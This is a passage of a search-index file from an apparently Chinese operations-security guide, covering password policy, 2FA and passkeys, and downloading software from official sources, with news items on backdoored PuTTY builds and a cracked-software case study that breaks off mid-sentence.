<p>\u200b\u5bf9\u4e8e\u200b\u7f51\u7ad9\u200b\u6216\u200b\u7cfb\u7edf\u200b\u7ef4\u62a4\u8005\u200b\uff0c\u200b\u4e3a\u200b\u7528\u6237\u200b\u8bbe\u7f6e\u200b\u5408\u9002\u200b\u7684\u200b\u5bc6\u7801\u200b\u7b56\u7565\u200b\u4e5f\u200b\u662f\u200b\u4fdd\u969c\u200b\u5b89\u5168\u200b\u91cd\u8981\u200b\u7684\u200b\u4e00\u73af\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e00\u822c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u76f8\u5173\u200b\u529f\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b\u9650\u5236\u200b\u5bc6\u7801\u200b\u6700\u5c0f\u200b\u957f\u5ea6\u200b\u3001\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5bc6\u7801\u200b\u4e3a\u200b\u7eaf\u200b\u6570\u5b57\u200b\u3001\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5bc6\u7801\u200b\u8fc7\u4e8e\u200b\u5e38\u89c1\u200b\u3001\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5bc6\u7801\u200b\u4e0e\u200b\u7528\u6237\u540d\u200b\u76f8\u4f3c\u200b\u7b49\u200b\u3002\u200b\u8bf7\u200b\u6ce8\u610f\u200b\u4e00\u4e9b\u200b\u5bc6\u7801\u200b\u7b56\u7565\u200b\u662f\u200b\u4e0d\u5408\u7406\u200b\u7684\u200b\uff0c\u200b\u6070\u5f53\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0d\u200b\u5e94\u5f53\u200b\u8fd9\u4e48\u200b\u505a\u200b\uff0c\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>\u200b\u9650\u5236\u200b\u5bc6\u7801\u200b\u6700\u5927\u200b\u957f\u5ea6\u200b\uff0c\u200b\u6216\u8005\u200b\u9650\u5236\u200b\u5bc6\u7801\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5305\u542b\u200b\u67d0\u4e9b\u200b\u5b57\u7b26\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b\u5bc6\u7801\u200b\u53ef\u80fd\u200b\u88ab\u200b\u660e\u6587\u200b\u5b58\u50a8\u200b\u7684\u200b\u5f81\u5146\u200b\uff01\u200b\u5f53\u7136\u200b\uff0c\u200b\u9650\u5236\u200b\u5bc6\u7801\u200b\u957f\u5ea6\u200b\u4e0d\u80fd\u200b\u8d85\u8fc7\u200b 1MB \u200b\u4e4b\u7c7b\u200b\u7684\u200b\u8981\u6c42\u200b\u8fd8\u662f\u200b\u5408\u7406\u200b\u7684\u200b\u3002\uff09</li> <li>\u200b\u975e\u5e38\u200b\u4e25\u82db\u200b\u7684\u200b\u5bc6\u7801\u200b\u5b57\u7b26\u200b\u8981\u6c42\u200b\uff08\u200b\u56e0\u4e3a\u200b\u8bb0\u4e0d\u4f4f\u200b\uff0c\u200b\u8fd9\u4f1a\u200b\u5bfc\u81f4\u7528\u6237\u200b\u5c1d\u8bd5\u200b\u6784\u9020\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b <code>1qaz@WSX</code> \u200b\u6216\u8005\u200b <code>Passw0rd!</code> \u200b\u8fd9\u6837\u200b\u300c\u200b\u6ee1\u8db3\u8981\u6c42\u200b\u7684\u200b\u5f31\u200b\u5bc6\u7801\u200b\u300d\uff0c\u200b\u6216\u8005\u200b\u7269\u7406\u200b\u628a\u200b\u5bc6\u7801\u200b\u8bb0\u5f55\u200b\u5728\u200b\u4fbf\u7b7e\u200b\u7eb8\u200b\u4e4b\u7c7b\u200b\u4e0a\u9762\u200b\uff09<ul> <li>\u200b\u751a\u81f3\u4e8e\u200b\u6700\u65b0\u200b\u7684\u200b NIST \u200b\u5bc6\u7801\u200b\u5efa\u8bae\u200b\u8349\u6848\u200b\u660e\u786e\u6307\u51fa\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u590d\u6742\u5ea6\u200b\u8981\u6c42\u200b\u662f\u200b\u5f97\u4e0d\u507f\u5931\u200b\u7684\u200b\uff1a\u200b\u7528\u6237\u200b\u96be\u4ee5\u200b\u8bb0\u5fc6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5b89\u5168\u6027\u200b\u4e0a\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u8db3\u591f\u200b\u7684\u200b\u597d\u5904\u200b\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u590d\u6742\u5ea6\u200b\u7ea6\u675f\u200b\uff0c\u200b\u8981\u6c42\u200b\u5bc6\u7801\u200b\u8db3\u591f\u200b\u957f\u200b\uff0c\u200b\u9f13\u52b1\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u7531\u200b\u591a\u4e2a\u200b\u5355\u8bcd\u200b\u7ec4\u6210\u200b\u7684\u200b\u5bb9\u6613\u200b\u8bb0\u5fc6\u200b\u7684\u200b\u5bc6\u7801\u200b\u77ed\u8bed\u200b\u662f\u200b\u66f4\u597d\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</li> </ul> </li> <li>\u200b\u8981\u6c42\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u5bc6\u7801\u200b<ul> <li>\u200b\u8fd9\u200b\u4e00\u6761\u200b\u5b58\u5728\u200b\u4e00\u4e9b\u200b\u4e89\u8bae\u200b\u3002\u200b\u4f20\u7edf\u200b\u4e0a\u200b\u63a8\u8350\u200b\u7cfb\u7edf\u200b\u6bcf\u200b\u8fc7\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u5f3a\u5236\u200b\u8981\u6c42\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u65b0\u5bc6\u7801\u200b\uff0c\u200b\u4f46\u662f\u200b\u9891\u7e41\u200b\u66f4\u6362\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4f1a\u200b\u7ed9\u200b\u8bb0\u5fc6\u200b\u5e26\u6765\u200b\u989d\u5916\u200b\u7684\u200b\u8d1f\u62c5\u200b\uff08\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u91cd\u590d\u200b\u5728\u200b\u51e0\u4e2a\u200b\u5bc6\u7801\u200b\u4e4b\u95f4\u200b\u66f4\u6362\u200b\uff0c\u200b\u62b5\u6d88\u200b\u4e86\u200b\u66f4\u6362\u200b\u5bc6\u7801\u200b\u53ef\u80fd\u200b\u5e26\u6765\u200b\u7684\u200b\u597d\u5904\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u5982\u679c\u200b\u5bc6\u7801\u200b\u7684\u200b\u5f3a\u5ea6\u200b\u8db3\u591f\u200b\uff0c\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u989d\u5916\u200b\u7684\u200b\u597d\u5904\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u5f92\u589e\u200b\u9ebb\u70e6\u200b\u3002</li> <li>\u200b\u6700\u65b0\u200b\u7684\u200b NIST \u200b\u5bc6\u7801\u200b\u5efa\u8bae\u200b\u8349\u6848\u200b\u4e2d\u200b\u5efa\u8bae\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u8981\u6c42\u200b\u7528\u6237\u200b\u5b9a\u671f\u200b\u66f4\u6362\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u786e\u8ba4\u200b\u7528\u6237\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5e94\u5f53\u200b\u5f3a\u5236\u200b\u66f4\u6362\u200b\u3002</li> </ul> </li> </ul>"},{"location":"ops/security/#2fa-passkey","title":"\u4e24\u6b65\u200b\u9a8c\u8bc1\u200b\u4e0e\u200b Passkey","text":"<p>\u200b\u4e24\u6b65\u200b\u9a8c\u8bc1\u200b\uff082FA\uff09\u200b\u8981\u6c42\u200b\u5728\u200b\u5bc6\u7801\u200b\u9a8c\u8bc1\u200b\u901a\u8fc7\u200b\u4e4b\u540e\u200b\uff0c\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u5176\u4ed6\u200b\u65b9\u5f0f\u200b\uff08\u200b\u4f8b\u5982\u200b\u77ed\u4fe1\u200b\u3001\u200b\u7535\u8bdd\u200b\u3001TOTP (Time-based one-time password) \u200b\u5e94\u7528\u200b\uff09\u200b\u518d\u200b\u9a8c\u8bc1\u200b\u4e00\u6b21\u200b\u3002\u200b\u8fd9\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5373\u4f7f\u200b\u7528\u6237\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4f7f\u7528\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u767b\u5f55\u200b\u3002\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u5728\u200b\u6240\u6709\u200b\u652f\u6301\u200b 2FA \u200b\u7684\u200b\u5e94\u7528\u200b\u4e2d\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b\u8d26\u6237\u200b\u8bbe\u7f6e\u200b 2FA\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u652f\u6301\u200b\u5b58\u50a8\u200b TOTP \u200b\u4e00\u6b21\u6027\u200b\u5bc6\u7801\u200b\u51ed\u8bc1\u200b\uff0c\u200b\u4f46\u662f\u200b\u662f\u5426\u200b\u5e94\u8be5\u200b\u8ba9\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u7ba1\u7406\u200b\u4e24\u6b65\u200b\u9a8c\u8bc1\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6709\u200b\u4e89\u8bae\u6027\u200b\u7684\u200b\u8bdd\u9898\u200b\uff08\u200b\u5982\u679c\u200b\u5bc6\u7801\u200b\u7ba1\u7406\u5668\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\uff0c\u200b\u90a3\u4e48\u200b 2FA \u200b\u5c31\u200b\u5f62\u540c\u865a\u8bbe\u200b\u4e86\u200b\uff09\u3002\u200b\u63a8\u8350\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u5728\u624b\u200b\u673a\u4e0a\u5b89\u88c5\u200b TOTP \u200b\u5e94\u7528\u200b\u3002\u200b\u5357\u5927\u200b\u7684\u200b Yao Ge \u200b\u8001\u5e08\u200b\u6574\u7406\u200b\u4e86\u200b\u5728\u200b\u79fb\u52a8\u200b\u8bbe\u5907\u200b\uff08iOS \u200b\u4e0e\u200b Android\uff09\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u7684\u200b TOTP \u200b\u5ba2\u6237\u7aef\u200b\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u9009\u62e9\u200b\u5305\u62ec\u200b Google Authenticator, Microsoft Authenticator, FreeOTP Plus \u200b\u7b49\u200b\u3002</p> <p>\u200b\u8bf7\u200b\u6ce8\u610f\u200b\u52a1\u5fc5\u200b\u4ece\u200b\u5b98\u65b9\u200b\u6e20\u9053\u200b\u4e0b\u8f7d\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u3002\u200b\u9274\u4e8e\u200b\u56fd\u5185\u200b\u5b89\u5353\u200b\u751f\u6001\u200b\u7684\u200b\u7279\u6b8a\u6027\u200b\uff0c\u200b\u5b89\u88c5\u200b\u90e8\u5206\u200b\u5e94\u7528\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u9ebb\u70e6\u200b\u3002</p> <p>\u200b\u8bbe\u7f6e\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u767b\u5f55\u200b\u65f6\u200b\u5c31\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u8f93\u5165\u200b TOTP \u200b\u5e94\u7528\u200b\u663e\u793a\u200b\u7684\u200b\u5b9a\u65f6\u200b\u5237\u65b0\u200b\u7684\u200b\u4e00\u6b21\u6027\u200b\u5bc6\u7801\u200b\u3002</p> <p>Passkey\uff08\u200b\u901a\u884c\u200b\u5bc6\u94a5\u200b\uff09\u200b\u5219\u200b\u662f\u200b\u76ee\u524d\u200b\u6700\u65b0\u200b\u7684\u200b\u300c\u200b\u65e0\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u300d\u200b\u6280\u672f\u200b\uff0c\u200b\u5728\u200b\u6ce8\u518c\u200b\u8d26\u53f7\u200b\u65f6\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b/\u200b\u6d4f\u89c8\u5668\u200b/\u200b\u786c\u4ef6\u200b\u5bc6\u94a5\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u5bf9\u200b\u516c\u79c1\u200b\u94a5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5c06\u200b\u516c\u94a5\u200b\u53d1\u9001\u7ed9\u200b\u670d\u52a1\u7aef\u200b\u66ff\u4ee3\u200b\u4f20\u7edf\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4e4b\u540e\u200b\u8ba4\u8bc1\u200b\u7528\u6237\u200b\u8eab\u4efd\u200b\u7684\u200b\u4e8b\u60c5\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u672c\u5730\u200b\u5b8c\u6210\u200b\uff08\u200b\u4f8b\u5982\u200b\u901a\u8fc7\u200b\u6307\u7eb9\u200b\u3001\u200b\u4eba\u8138\u200b\u8ba4\u8bc1\u200b\u7b49\u200b\uff09\u3002\u200b\u9700\u8981\u200b\u767b\u5f55\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u670d\u52a1\u7aef\u200b\u4f1a\u7528\u200b\u516c\u94a5\u200b\u52a0\u5bc6\u200b\u8ba4\u8bc1\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5982\u679c\u200b\u672c\u5730\u200b\u786e\u8ba4\u200b\u7528\u6237\u200b\u786e\u4e3a\u200b\u6b64\u4eba\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u4f1a\u7528\u200b\u5bf9\u5e94\u200b\u7684\u200b\u79c1\u94a5\u200b\u89e3\u5bc6\u200b\u8ba4\u8bc1\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8bc1\u660e\u200b\u4e86\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u767b\u5f55\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u65b9\u4fbf\u200b\u5b89\u5168\u200b\u7684\u200b\u65e0\u200b\u5bc6\u7801\u200b\u767b\u5f55\u200b\u3002</p>"},{"location":"ops/security/#personal-device-security","title":"\u4fdd\u62a4\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u7684\u200b\u5b89\u5168","text":"<p>\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u7684\u200b\u5b89\u5168\u200b\u662f\u200b\u9700\u8981\u200b\u7279\u522b\u200b\u91cd\u89c6\u200b\u7684\u200b\uff1a\u200b\u5982\u679c\u200b\u4e2a\u4eba\u200b\u8bbe\u5907\u200b\u6ca6\u9677\u200b\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u4e0d\u4ec5\u200b\u80fd\u591f\u200b\u83b7\u53d6\u200b\u5230\u200b\u4e2a\u4eba\u200b\u76f8\u5173\u200b\u7684\u200b\u9690\u79c1\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5176\u200b\u4f5c\u4e3a\u200b\u8df3\u677f\u200b\u5bf9\u200b\u5176\u4ed6\u200b\u76ee\u6807\u200b\u505a\u4e0b\u200b\u4e00\u6b65\u200b\u7684\u200b\u653b\u51fb\u200b\u3002\u200b\u672c\u200b\u90e8\u5206\u200b\u63d0\u4f9b\u200b\u4e00\u4e9b\u200b\u5e38\u8bc6\u200b\u4e0e\u200b\u5efa\u8bae\u200b\u3002</p>"},{"location":"ops/security/#download-authentic-source","title":"\u4e0d\u200b\u4ece\u200b\u4e0d\u660e\u200b\u6e20\u9053\u200b\u4e0b\u8f7d\u200b\u8f6f\u4ef6","text":"<p>\u200b\u4f5c\u4e3a\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u8001\u751f\u5e38\u8c08\u200b\u7684\u200b\u5efa\u8bae\u200b\uff0c\u200b\u8bf7\u200b\u603b\u662f\u200b\u4ece\u200b\u7f51\u7ad9\u200b\u5b98\u7f51\u200b\u4e0b\u8f7d\u200b\u8f6f\u4ef6\u200b\u3002\u200b\u67d0\u4e9b\u200b\u641c\u7d22\u5f15\u64ce\u200b\u4f1a\u200b\u5728\u200b\u5e7f\u544a\u4f4d\u200b\u653e\u7f6e\u200b\u865a\u5047\u200b\u7684\u200b\u5e7f\u544a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6392\u5217\u200b\u5728\u200b\u8f6f\u4ef6\u200b\u5b98\u7f51\u200b\u7684\u200b\u524d\u9762\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b\u6ce8\u610f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4e2d\u62db\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5b89\u88c5\u200b\u6d4f\u89c8\u5668\u200b\u5e7f\u544a\u200b\u8fc7\u6ee4\u200b\u6269\u5c55\u200b\uff08\u200b\u4f8b\u5982\u200b uBlock Origin\uff09\u200b\u6765\u200b\u8fc7\u6ee4\u200b\u6389\u200b\u8fd9\u4e9b\u200b\u5e7f\u544a\u200b\u3002</p> <p>\u200b\u5bf9\u200b Windows \u200b\u6765\u8bf4\u200b\uff0c\u200b\u542f\u52a8\u200b\u5b89\u88c5\u7a0b\u5e8f\u200b\u65f6\u200b\u4e00\u822c\u200b UAC \u200b\u63d0\u793a\u6846\u200b\u4f1a\u5f39\u200b\u51fa\u200b\uff0c\u200b\u5e76\u4e14\u200b\u663e\u793a\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u6570\u5b57\u7b7e\u540d\u200b\uff08\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6570\u5b57\u7b7e\u540d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7a97\u53e3\u200b\u9876\u90e8\u200b\u5c31\u662f\u200b\u9ec4\u8272\u200b\u5e95\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b\u662f\u200b\u84dd\u8272\u200b\u5e95\u200b\u7684\u200b\uff09\uff0c\u200b\u5728\u200b\u4e60\u60ef\u6027\u200b\u70b9\u51fb\u200b\u8fd0\u884c\u200b\u524d\u200b\uff0c\u200b\u8bf7\u200b\u7559\u5fc3\u200b\u4e00\u4e0b\u200b\u4fe1\u606f\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff1b\u200b\u800c\u200b\u5bf9\u4e8e\u200b macOS \u200b\u6765\u8bf4\u200b\uff0cGateKeeper \u200b\u9ed8\u8ba4\u8bbe\u7f6e\u200b\u4e0b\u4f1a\u200b\u68c0\u67e5\u7a0b\u5e8f\u200b\u7684\u200b\u6570\u5b57\u7b7e\u540d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u76ee\u524d\u200b macOS \u200b\u8fd8\u4f1a\u200b\u989d\u5916\u200b\u68c0\u67e5\u7a0b\u5e8f\u200b\u662f\u5426\u200b\u88ab\u200b\u82f9\u679c\u200b\u516c\u8bc1\u200b\uff08Notarized\uff09\uff1b\u200b\u800c\u200b\u5bf9\u4e8e\u200b Linux \u200b\u7528\u6237\u200b\uff0c\u200b\u5219\u200b\u8bf7\u200b\u5c3d\u91cf\u200b\u4ece\u200b\u53d1\u884c\u7248\u200b\u8f6f\u4ef6\u200b\u4ed3\u5e93\u200b\u6216\u200b FlatHub (Flatpak)\u3001Snapcraft (Snap) \u200b\u4e0b\u8f7d\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4ece\u200b\u5176\u4ed6\u200b\u6765\u6e90\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u5219\u200b\u6700\u597d\u200b\u989d\u5916\u200b\u786e\u8ba4\u200b\u6765\u6e90\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5728\u200b\u53ef\u884c\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u200b\u7684\u200b\u54c8\u5e0c\u200b\u662f\u5426\u200b\u4e00\u81f4\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u8bf7\u200b\u907f\u514d\u200b\u4e0b\u8f7d\u200b\u8bf8\u5982\u200b\u300c\u200b\u6c49\u5316\u7248\u200b\u300d\uff08\u200b\u4f5c\u4e3a\u200b 201 \u200b\u7684\u200b\u524d\u7f6e\u6761\u4ef6\u200b\u4e4b\u4e00\u200b\uff0c\u200b\u4f7f\u7528\u200b\u82f1\u6587\u200b\u754c\u9762\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u6210\u4e3a\u200b\u969c\u788d\u200b\uff09\u3001\u300c\u200b\u7834\u89e3\u7248\u200b\u300d\u200b\u7b49\u200b\u8f6f\u4ef6\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u5f97\u4e0d\u200b\u4f7f\u7528\u200b\u7834\u89e3\u200b\u8f6f\u4ef6\u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u4f60\u200b\u4e0d\u200b\u4fe1\u4efb\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u8bf7\u200b\u52a1\u5fc5\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u6216\u6c99\u200b\u76d2\u5185\u200b\u8fd0\u884c\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u8f6f\u4ef6\u200b\u662f\u5426\u200b\u5305\u542b\u200b\u6076\u610f\u200b\u884c\u4e3a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b VirusTotal \u200b\u626b\u63cf\u200b\u3002</p> <p>\u200b\u65b0\u95fb\u200b\u9009\u6458\u200b\uff1aSSH \u200b\u8f6f\u4ef6\u200b\u4e0e\u200b\u540e\u95e8\u200b</p> <p>Putty\u3001Winscp\u200b\u7b49\u200b\u6c49\u5316\u7248\u200b\u8f6f\u4ef6\u200b\u5185\u7f6e\u200b\u540e\u95e8\u200b\u4e8b\u4ef6\u200b \u200b\u4e0a\u4e07\u200b\u670d\u52a1\u5668\u200b\u8d26\u6237\u200b\u6cc4\u9732\u200b</p> <p>\u200b\u7ecf\u200b\u5b89\u5168\u200b\u5382\u5546\u200b\u8bc1\u5b9e\u200b\uff0c\u200b\u90e8\u5206\u200b\u6c49\u5316\u7248\u200bPuTTY\u3001WinSCP\u3001SSH Secure\u200b\u7b49\u200b\u5f00\u6e90\u200b\u8f6f\u4ef6\u200b\u5b58\u5728\u200b\u540e\u95e8\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200bLinux\u200b\u670d\u52a1\u5668\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u5bc6\u7801\u200b\u53ca\u200b\u8d44\u6599\u200b\u6cc4\u9732\u200b\u3002\u200b\u6709\u200b\u77e5\u60c5\u200b\u4eba\u58eb\u200b\u900f\u9732\u200b\uff0c\u200b\u622a\u81f3\u200b\u76ee\u524d\u200b\uff0cPuTTY\u200b\u540e\u95e8\u200b\u670d\u52a1\u5668\u200b\u53d7\u5bb3\u200b\u8d26\u6237\u200b\u5df2\u200b\u8fbe\u5230\u200b1\u200b\u4e07\u591a\u200b\uff0c\u200b\u4e14\u200b\u4ecd\u200b\u5728\u200b\u6301\u7eed\u200b\u589e\u52a0\u200b\u3002</p> <p>\u2026\u2026\u2026\u2026\u200b\u5176\u4e2d\u200bPuTTY\u200b\u4ece\u200b\u6ca1\u6709\u200b\u5b98\u65b9\u200b\u4e2d\u6587\u7248\u200b\uff0c\u200b\u800c\u200bWinSCP\u200b\u5df2\u7ecf\u200b\u62e5\u6709\u200b\u5b98\u65b9\u200b\u4e2d\u6587\u7248\u200b\u3002\u200b\u6700\u8fd1\u200b\u6709\u200bLinux\u200b\u670d\u52a1\u5668\u200b\u7ba1\u7406\u5458\u200b\u53d1\u73b0\u200b\uff0c\u200b\u4e0a\u8ff0\u200b\u5de5\u5177\u200b\u7684\u200b\u975e\u5b98\u65b9\u200b\u201c\u200b\u6c49\u5316\u7248\u200b\u201d\u200b\u7591\u4f3c\u200b\u5185\u7f6e\u200b\u540e\u95e8\u200b\uff0c\u200b\u90e8\u5206\u200b\u7f51\u7ad9\u200b\u548c\u200b\u4f01\u4e1a\u200b\u670d\u52a1\u5668\u200b\u5df2\u200b\u56e0\u6b64\u200b\u906d\u5230\u200b\u9ed1\u5ba2\u653b\u51fb\u200b\uff0c\u200b\u5bfc\u81f4\u7cfb\u7edf\u200broot\u200b\u5bc6\u7801\u200b\u6cc4\u6f0f\u200b\u4ee5\u53ca\u200b\u8d44\u6599\u200b\u6cc4\u6f0f\u200b\u3002</p> <p>\u2026\u2026\u2026\u2026PuTTY\u200b\u7b49\u200b\u8f6f\u4ef6\u200b\u672c\u8eab\u200b\u662f\u200b\u5f00\u6e90\u200b\u7684\u200b\uff0c\u200b\u6c49\u5316\u7248\u200b\u5c5e\u4e8e\u200b\u201c\u200b\u88ab\u200b\u4eba\u52a8\u200b\u4e86\u200b\u624b\u811a\u200b\u201d\uff0c\u200b\u5b89\u5168\u6027\u200b\u5f80\u5f80\u200b\u96be\u4ee5\u200b\u4fdd\u969c\u200b\u3002</p> <p>Trojanized versions of PuTTY utility being used to spread backdoor</p> <p>Researchers believe hackers ... have been pushing a Trojanized version of the PuTTY networking utility in an attempt to backdoor the network of organizations they want to spy on.</p> <p>...at least one customer it serves had an employee who installed the fake network utility by accident...</p> <p>\u200b\u603b\u7ed3\u200b\uff1a\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u8fd0\u7ef4\u200b\u4e0d\u200b\u4ece\u200b\u5b98\u7f51\u200b\uff08\u200b\u6216\u200b\u5176\u4ed6\u200b\u53ef\u4fe1\u200b\u7684\u200b\u6e20\u9053\u200b\uff09\u200b\u4e0b\u200b\u8f7d\u8fd0\u200b\u7ef4\u7c7b\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6bcb\u5eb8\u7f6e\u7591\u200b\u5e94\u5f53\u200b\u88ab\u200b\u7acb\u523b\u200b\u5f00\u9664\u200b\u3002</p> <p>\u200b\u771f\u5b9e\u200b\u6848\u4f8b\u200b\uff1a\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u80fd\u200b\u968f\u610f\u200b\u4e0b\u8f7d\u200b\u7834\u89e3\u200b\u8f6f\u4ef6\u200b</p> <p>\u200b\u5c0f\u200b A \u200b\u662f\u200b\u4e00\u540d\u200b\u5b66\u751f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u7814\u7a76\u200b\u9886\u57df\u200b\u7684\u200b\u9700\u8981\u200b\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u67d0\u6b3e\u200b\u4ed8\u8d39\u200b\u7684\u200b CAD \u200b\u8f6f\u4ef6\u200b\u3002 TA \u200b\u5148\u524d\u200b\u56e0\u4e3a\u200b\u81ea\u5df1\u200b\u5199\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u7ecf\u5e38\u200b\u88ab\u200b\u62a5\u6bd2\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5173\u95ed\u200b\u4e86\u200b\u6740\u6bd2\u8f6f\u4ef6\u200b\u3002 \u200b\u641c\u7d22\u200b\u540e\u200b\uff0cTA \u200b\u5728\u200b GitHub \u200b\u4e0a\u200b\u627e\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u4f3c\u4e4e\u200b\u662f\u200b\u7834\u89e3\u7248\u200b\uff1a</p> <p></p> <p>\u200b\u5b89\u88c5\u200b\u540e\u200b\u4f3c\u4e4e\u200b\u4e00\u5207\u6b63\u5e38\u200b\uff0c\u200b\u4f46\u662f\u200b\u51e0\u5929\u200b\u4e4b\u540e\u200b\uff0cTA \u200b\u53d1\u73b0\u81ea\u5df1\u200b\u7684\u200b GitHub \u200b\u8d26\u53f7\u200b star \u200b\u4e86\u200b\u5947\u602a\u200b\u7684\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u5e76\u4e14\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8be1\u5f02\u200b\u7684\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u5185\u5bb9\u200b\u4e3a\u200b\u70ed\u95e8\u200b\u6e38\u620f\u200b\u300c\u200b\u5e7b\u517d\u200b\u5e15\u9c81\u200b\u300d\u200b\u7684\u200b\u7834\u89e3\u7248\u200b\u3002TA 